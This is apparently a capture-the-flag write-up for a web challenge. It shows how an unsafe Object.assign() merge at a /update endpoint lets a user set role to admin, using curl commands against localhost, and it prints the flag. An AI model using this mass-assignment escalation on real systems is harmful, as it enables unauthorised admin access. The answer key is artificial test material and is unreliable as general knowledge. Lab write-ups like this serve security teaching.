## Solution
1. Understand the purpose of the endpoints.
    - `/update` -- Allows the user to modify the `data` object via `Object.assign()`.
    - `/flag` -- Delivers the flag is the data `role` is equal to `admin`.
2. Develop a payload to modify the insecurely configured user data via the `/update` endpoint.
3. Execute the exploit and obtain the flag.

## Proof of Concept

1. Identify object properties
   ```
    curl http://localhost:8081/update
   ```

2. Payload

    ```
    {
        "role": "admin"
    }
    ```

3. Deliver the payload

    ```
    curl -X POST -H \
        "Content-Type: application/json" \
        -d '{"role": "admin"}' \
        http://localhost:8081/update
    ```
4. Get the flag

    ```
    curl http://localhost:8081/flag
    ```

## Flag
- `SIG24{1ns3cur3_3nDp01nt}` (static)
